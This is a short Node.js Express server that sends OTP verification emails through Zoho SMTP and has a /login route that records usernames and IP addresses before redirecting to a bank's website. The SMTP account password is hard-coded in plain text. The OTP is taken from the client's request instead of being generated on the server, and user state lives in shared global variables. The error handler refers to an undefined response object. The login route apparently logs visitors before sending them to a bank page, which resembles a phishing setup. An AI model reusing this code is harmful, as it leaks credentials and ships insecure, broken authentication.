const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const port = 10000;

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(cors());
let uniqueOtp; // Declare otp as a global variable
let email;
function sendOtpEmail(){
    const transporter = nodemailer.createTransport({
        host: 'smtp.zoho.com',
        port: 465,
        secure: true,
        auth: {
            user: 'rishishahnepal@zohomail.com',
            pass: 'Rishishah@2'
        }
    });

    const mailOptions = {
        from: 'rishishahnepal@zohomail.com',
        to: email,
        subject: 'OTP Verification',
        text: `Your OTP is: ${uniqueOtp}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error sending email:', error);
            return res.status(500).send('Failed to send OTP');
        }
        console.log('Email sent:', info.response);
    });
}
app.post('/sendOTP', (req, res) => {
     email = req.body.email;
     uniqueOtp = req.body.code;

    if (!email) {
        return res.status(400).send('Email is required');
    }
   sendOtpEmail();
        res.status(200).send('OTP sent successfully');
});
app.use(bodyParser.json());

// Variable to store user data
let userData = [];

// Route to handle login form submission
app.post('/login', (req, res) => {
    const { username } = req.body;
    const ip = req.ip;

    // Save username and IP address in userData array
    userData.push({ username, ip });

    // Redirect user to index.html
    res.redirect('https://jnpbank.com/index.html');
});


app.listen(port, () => {
    console.log(`Server is running on ${port}`);
});
